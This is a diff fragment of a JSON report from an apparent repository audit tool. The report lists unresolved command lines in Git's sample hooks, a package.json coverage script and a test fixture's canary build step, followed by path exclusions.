+              "evidenceTruncated": false,
+              "command": "git am -3 \"$file\""
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\sendemail-validate.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 34,
+              "evidence": "\tgit am -3 \"$file\" || return",
+              "evidenceTruncated": false,
+              "command": "return"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\sendemail-validate.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 38,
+              "evidence": "}",
+              "evidenceTruncated": false,
+              "command": "}"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\sendemail-validate.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 40,
+              "evidence": "validate_series () {",
+              "evidenceTruncated": false,
+              "command": "validate_series () {"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\sendemail-validate.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 44,
+              "evidence": "}",
+              "evidenceTruncated": false,
+              "command": "}"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\sendemail-validate.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 48,
+              "evidence": "if test \"$GIT_SENDEMAIL_FILE_COUNTER\" = 1",
+              "evidenceTruncated": false,
+              "command": "if test \"$GIT_SENDEMAIL_FILE_COUNTER\" = 1"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\sendemail-validate.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 49,
+              "evidence": "then",
+              "evidenceTruncated": false,
+              "command": "then"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\sendemail-validate.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 50,
+              "evidence": "\tremote=$(git config --default origin --get sendemail.validateRemote) &&",
+              "evidenceTruncated": false,
+              "command": "config --default origin --get sendemail.validateRemote)"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\sendemail-validate.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 51,
+              "evidence": "\tref=$(git config --default HEAD --get sendemail.validateRemoteRef) &&",
+              "evidenceTruncated": false,
+              "command": "config --default HEAD --get sendemail.validateRemoteRef)"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\sendemail-validate.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 52,
+              "evidence": "\tworktree=$(mktemp --tmpdir -d sendemail-validate.XXXXXXX) &&",
+              "evidenceTruncated": false,
+              "command": "--tmpdir -d sendemail-validate.XXXXXXX)"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\sendemail-validate.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 53,
+              "evidence": "\tgit worktree add -fd --checkout \"$worktree\" \"refs/remotes/$remote/$ref\" &&",
+              "evidenceTruncated": false,
+              "command": "git worktree add -fd --checkout \"$worktree\" \"refs/remotes/$remote/$ref\""
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\sendemail-validate.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 54,
+              "evidence": "\tgit config --replace-all sendemail.validateWorktree \"$worktree\"",
+              "evidenceTruncated": false,
+              "command": "git config --replace-all sendemail.validateWorktree \"$worktree\""
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\sendemail-validate.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 55,
+              "evidence": "else",
+              "evidenceTruncated": false,
+              "command": "else"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\sendemail-validate.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 56,
+              "evidence": "\tworktree=$(git config --get sendemail.validateWorktree)",
+              "evidenceTruncated": false,
+              "command": "config --get sendemail.validateWorktree)"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\sendemail-validate.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 57,
+              "evidence": "fi || {",
+              "evidenceTruncated": false,
+              "command": "fi"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\sendemail-validate.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 57,
+              "evidence": "fi || {",
+              "evidenceTruncated": false,
+              "command": "{"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\sendemail-validate.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 60,
+              "evidence": "}",
+              "evidenceTruncated": false,
+              "command": "}"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\sendemail-validate.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 62,
+              "evidence": "unset GIT_DIR GIT_WORK_TREE",
+              "evidenceTruncated": false,
+              "command": "unset GIT_DIR GIT_WORK_TREE"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\sendemail-validate.sample",
+              "reason": "Dynamic working directory",
+              "line": 63,
+              "evidence": "cd \"$worktree\" &&",
+              "evidenceTruncated": false
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\sendemail-validate.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 65,
+              "evidence": "if grep -q \"^diff --git \" \"$1\"",
+              "evidenceTruncated": false,
+              "command": "if grep -q \"^diff --git \" \"$1\""
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\sendemail-validate.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 66,
+              "evidence": "then",
+              "evidenceTruncated": false,
+              "command": "then"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\sendemail-validate.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 67,
+              "evidence": "\tvalidate_patch \"$1\"",
+              "evidenceTruncated": false,
+              "command": "validate_patch \"$1\""
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\sendemail-validate.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 68,
+              "evidence": "else",
+              "evidenceTruncated": false,
+              "command": "else"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\sendemail-validate.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 69,
+              "evidence": "\tvalidate_cover_letter \"$1\"",
+              "evidenceTruncated": false,
+              "command": "validate_cover_letter \"$1\""
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\sendemail-validate.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 70,
+              "evidence": "fi &&",
+              "evidenceTruncated": false,
+              "command": "fi"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\sendemail-validate.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 72,
+              "evidence": "if test \"$GIT_SENDEMAIL_FILE_COUNTER\" = \"$GIT_SENDEMAIL_FILE_TOTAL\"",
+              "evidenceTruncated": false,
+              "command": "if test \"$GIT_SENDEMAIL_FILE_COUNTER\" = \"$GIT_SENDEMAIL_FILE_TOTAL\""
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\sendemail-validate.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 73,
+              "evidence": "then",
+              "evidenceTruncated": false,
+              "command": "then"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\sendemail-validate.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 74,
+              "evidence": "\tgit config --unset-all sendemail.validateWorktree &&",
+              "evidenceTruncated": false,
+              "command": "git config --unset-all sendemail.validateWorktree"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\sendemail-validate.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 75,
+              "evidence": "\ttrap 'git worktree remove -ff \"$worktree\"' EXIT &&",
+              "evidenceTruncated": false,
+              "command": "trap 'git worktree remove -ff \"$worktree\"' EXIT"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\sendemail-validate.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 76,
+              "evidence": "\tvalidate_series",
+              "evidenceTruncated": false,
+              "command": "validate_series"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\sendemail-validate.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 77,
+              "evidence": "fi",
+              "evidenceTruncated": false,
+              "command": "fi"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\update.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 28,
+              "evidence": "refname=\"$1\"",
+              "evidenceTruncated": false,
+              "command": "refname=\"$1\""
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\update.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 29,
+              "evidence": "oldrev=\"$2\"",
+              "evidenceTruncated": false,
+              "command": "oldrev=\"$2\""
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\update.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 30,
+              "evidence": "newrev=\"$3\"",
+              "evidenceTruncated": false,
+              "command": "newrev=\"$3\""
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\update.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 33,
+              "evidence": "if [ -z \"$GIT_DIR\" ]; then",
+              "evidenceTruncated": false,
+              "command": "if [ -z \"$GIT_DIR\" ]"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\update.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 33,
+              "evidence": "if [ -z \"$GIT_DIR\" ]; then",
+              "evidenceTruncated": false,
+              "command": "then"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\update.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 38,
+              "evidence": "fi",
+              "evidenceTruncated": false,
+              "command": "fi"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\update.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 40,
+              "evidence": "if [ -z \"$refname\" -o -z \"$oldrev\" -o -z \"$newrev\" ]; then",
+              "evidenceTruncated": false,
+              "command": "if [ -z \"$refname\" -o -z \"$oldrev\" -o -z \"$newrev\" ]"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\update.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 40,
+              "evidence": "if [ -z \"$refname\" -o -z \"$oldrev\" -o -z \"$newrev\" ]; then",
+              "evidenceTruncated": false,
+              "command": "then"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\update.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 43,
+              "evidence": "fi",
+              "evidenceTruncated": false,
+              "command": "fi"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\update.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 46,
+              "evidence": "allowunannotated=$(git config --type=bool hooks.allowunannotated)",
+              "evidenceTruncated": false,
+              "command": "config --type=bool hooks.allowunannotated)"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\update.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 47,
+              "evidence": "allowdeletebranch=$(git config --type=bool hooks.allowdeletebranch)",
+              "evidenceTruncated": false,
+              "command": "config --type=bool hooks.allowdeletebranch)"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\update.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 48,
+              "evidence": "denycreatebranch=$(git config --type=bool hooks.denycreatebranch)",
+              "evidenceTruncated": false,
+              "command": "config --type=bool hooks.denycreatebranch)"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\update.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 49,
+              "evidence": "allowdeletetag=$(git config --type=bool hooks.allowdeletetag)",
+              "evidenceTruncated": false,
+              "command": "config --type=bool hooks.allowdeletetag)"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\update.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 50,
+              "evidence": "allowmodifytag=$(git config --type=bool hooks.allowmodifytag)",
+              "evidenceTruncated": false,
+              "command": "config --type=bool hooks.allowmodifytag)"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\update.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 53,
+              "evidence": "projectdesc=$(sed -e '1q' \"$GIT_DIR/description\")",
+              "evidenceTruncated": false,
+              "command": "-e '1q' \"$GIT_DIR/description\")"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\update.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 54,
+              "evidence": "case \"$projectdesc\" in",
+              "evidenceTruncated": false,
+              "command": "case \"$projectdesc\" in"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\update.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 55,
+              "evidence": "\"Unnamed repository\"* | \"\")",
+              "evidenceTruncated": false,
+              "command": "\"Unnamed repository\"*"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\update.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 55,
+              "evidence": "\"Unnamed repository\"* | \"\")",
+              "evidenceTruncated": false,
+              "command": "\"\")"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\update.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 59,
+              "evidence": "esac",
+              "evidenceTruncated": false,
+              "command": "esac"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\update.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 63,
+              "evidence": "zero=$(git hash-object --stdin </dev/null | tr '[0-9a-f]' '0')",
+              "evidenceTruncated": false,
+              "command": "hash-object --stdin </dev/null"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\update.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 63,
+              "evidence": "zero=$(git hash-object --stdin </dev/null | tr '[0-9a-f]' '0')",
+              "evidenceTruncated": false,
+              "command": "tr '[0-9a-f]' '0')"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\update.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 64,
+              "evidence": "if [ \"$newrev\" = \"$zero\" ]; then",
+              "evidenceTruncated": false,
+              "command": "if [ \"$newrev\" = \"$zero\" ]"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\update.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 64,
+              "evidence": "if [ \"$newrev\" = \"$zero\" ]; then",
+              "evidenceTruncated": false,
+              "command": "then"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\update.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 65,
+              "evidence": "\tnewrev_type=delete",
+              "evidenceTruncated": false,
+              "command": "newrev_type=delete"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\update.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 66,
+              "evidence": "else",
+              "evidenceTruncated": false,
+              "command": "else"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\update.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 67,
+              "evidence": "\tnewrev_type=$(git cat-file -t $newrev)",
+              "evidenceTruncated": false,
+              "command": "cat-file -t $newrev)"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\update.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 68,
+              "evidence": "fi",
+              "evidenceTruncated": false,
+              "command": "fi"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\update.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 70,
+              "evidence": "case \"$refname\",\"$newrev_type\" in",
+              "evidenceTruncated": false,
+              "command": "case \"$refname\",\"$newrev_type\" in"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\update.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 71,
+              "evidence": "\trefs/tags/*,commit)",
+              "evidenceTruncated": false,
+              "command": "refs/tags/*,commit)"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\update.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 73,
+              "evidence": "\t\tshort_refname=${refname##refs/tags/}",
+              "evidenceTruncated": false,
+              "command": "short_refname=${refname##refs/tags/}"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\update.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 74,
+              "evidence": "\t\tif [ \"$allowunannotated\" != \"true\" ]; then",
+              "evidenceTruncated": false,
+              "command": "if [ \"$allowunannotated\" != \"true\" ]"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\update.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 74,
+              "evidence": "\t\tif [ \"$allowunannotated\" != \"true\" ]; then",
+              "evidenceTruncated": false,
+              "command": "then"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\update.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 78,
+              "evidence": "\t\tfi",
+              "evidenceTruncated": false,
+              "command": "fi"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\update.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 80,
+              "evidence": "\trefs/tags/*,delete)",
+              "evidenceTruncated": false,
+              "command": "refs/tags/*,delete)"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\update.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 82,
+              "evidence": "\t\tif [ \"$allowdeletetag\" != \"true\" ]; then",
+              "evidenceTruncated": false,
+              "command": "if [ \"$allowdeletetag\" != \"true\" ]"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\update.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 82,
+              "evidence": "\t\tif [ \"$allowdeletetag\" != \"true\" ]; then",
+              "evidenceTruncated": false,
+              "command": "then"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\update.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 85,
+              "evidence": "\t\tfi",
+              "evidenceTruncated": false,
+              "command": "fi"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\update.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 87,
+              "evidence": "\trefs/tags/*,tag)",
+              "evidenceTruncated": false,
+              "command": "refs/tags/*,tag)"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\update.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 89,
+              "evidence": "\t\tif [ \"$allowmodifytag\" != \"true\" ] && git rev-parse $refname > /dev/null 2>&1",
+              "evidenceTruncated": false,
+              "command": "if [ \"$allowmodifytag\" != \"true\" ]"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\update.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 89,
+              "evidence": "\t\tif [ \"$allowmodifytag\" != \"true\" ] && git rev-parse $refname > /dev/null 2>&1",
+              "evidenceTruncated": false,
+              "command": "git rev-parse $refname > /dev/null 2>&1"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\update.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 90,
+              "evidence": "\t\tthen",
+              "evidenceTruncated": false,
+              "command": "then"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\update.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 94,
+              "evidence": "\t\tfi",
+              "evidenceTruncated": false,
+              "command": "fi"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\update.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 96,
+              "evidence": "\trefs/heads/*,commit)",
+              "evidenceTruncated": false,
+              "command": "refs/heads/*,commit)"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\update.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 98,
+              "evidence": "\t\tif [ \"$oldrev\" = \"$zero\" -a \"$denycreatebranch\" = \"true\" ]; then",
+              "evidenceTruncated": false,
+              "command": "if [ \"$oldrev\" = \"$zero\" -a \"$denycreatebranch\" = \"true\" ]"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\update.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 98,
+              "evidence": "\t\tif [ \"$oldrev\" = \"$zero\" -a \"$denycreatebranch\" = \"true\" ]; then",
+              "evidenceTruncated": false,
+              "command": "then"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\update.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 101,
+              "evidence": "\t\tfi",
+              "evidenceTruncated": false,
+              "command": "fi"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\update.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 103,
+              "evidence": "\trefs/heads/*,delete)",
+              "evidenceTruncated": false,
+              "command": "refs/heads/*,delete)"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\update.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 105,
+              "evidence": "\t\tif [ \"$allowdeletebranch\" != \"true\" ]; then",
+              "evidenceTruncated": false,
+              "command": "if [ \"$allowdeletebranch\" != \"true\" ]"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\update.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 105,
+              "evidence": "\t\tif [ \"$allowdeletebranch\" != \"true\" ]; then",
+              "evidenceTruncated": false,
+              "command": "then"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\update.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 108,
+              "evidence": "\t\tfi",
+              "evidenceTruncated": false,
+              "command": "fi"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\update.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 110,
+              "evidence": "\trefs/remotes/*,commit)",
+              "evidenceTruncated": false,
+              "command": "refs/remotes/*,commit)"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\update.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 113,
+              "evidence": "\trefs/remotes/*,delete)",
+              "evidenceTruncated": false,
+              "command": "refs/remotes/*,delete)"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\update.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 115,
+              "evidence": "\t\tif [ \"$allowdeletebranch\" != \"true\" ]; then",
+              "evidenceTruncated": false,
+              "command": "if [ \"$allowdeletebranch\" != \"true\" ]"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\update.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 115,
+              "evidence": "\t\tif [ \"$allowdeletebranch\" != \"true\" ]; then",
+              "evidenceTruncated": false,
+              "command": "then"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\update.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 118,
+              "evidence": "\t\tfi",
+              "evidenceTruncated": false,
+              "command": "fi"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\update.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 120,
+              "evidence": "\t*)",
+              "evidenceTruncated": false,
+              "command": "*)"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\update.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 125,
+              "evidence": "esac",
+              "evidenceTruncated": false,
+              "command": "esac"
+            },
+            {
+              "path": "E:\\np-audit\\package.json",
+              "reason": "Command entry point is not statically resolved",
+              "line": 17,
+              "evidence": "    \"coverage\": \"npx c8@11.0.0 --reporter=lcov --reporter=text-summary node test/index.js\"",
+              "evidenceTruncated": false,
+              "command": "npx c8@11.0.0 --reporter=lcov --reporter=text-summary node test/index.js"
+            },
+            {
+              "path": "E:\\np-audit\\test\\fixtures\\incident-derived-reconstruction\\present\\package.json",
+              "reason": "Command entry point is not statically resolved",
+              "line": 5,
+              "evidence": "    \"build\": \"node canary.js && tsc\",",
+              "evidenceTruncated": false,
+              "command": "tsc"
+            }
+          ]
+        },
+        "evidence": []
+      },
+      "protection": {
+        "allowed": false,
+        "failures": [
+          {
+            "path": "E:\\np-audit\\test\\fixtures\\incident-derived-reconstruction\\present\\.githooks",
+            "reason": "Explicit path exclusion"
+          },
+          {
+            "path": "E:\\np-audit\\test\\fixtures\\incident-derived-reconstruction\\removed",
+            "reason": "Explicit path exclusion"
+          },
+          {
+            "path": "E:\\np-audit\\node_modules",
+            "reason": "Explicit path exclusion"
+          },
+          {
+            "path": "E:\\np-audit\\test\\fixtures\\incident-derived-reconstruction\\present\\.githooks",
+            "reason": "Explicit path exclusion"
+          },
+          {
+            "path": "E:\\np-audit\\test\\fixtures\\incident-derived-reconstruction\\removed",
+            "reason": "Explicit path exclusion"
+          },
+          {
+            "path": "E:\\np-audit\\node_modules",
+            "reason": "Explicit path exclusion"
+          }
+        ]
+      },
+      "exclusions": [
+        {
+          "path": "E:\\np-audit\\.git",
+          "reason": "Git metadata other than config, config.worktree, commondir and hooks is not analyzed"
+        },
+        {
+          "path": "E:\\np-audit\\test\\fixtures\\incident-derived-reconstruction\\present\\.githooks",
+          "reason": "Explicit path exclusion"
+        },
+        {
+          "path": "E:\\np-audit\\test\\fixtures\\incident-derived-reconstruction\\removed",
+          "reason": "Explicit path exclusion"
+        },
+        {
+          "path": "E:\\np-audit\\node_modules",
+          "reason": "Explicit path exclusion"
+        }
+      ],
+      "unreadable": []
+    }
+  }
+}
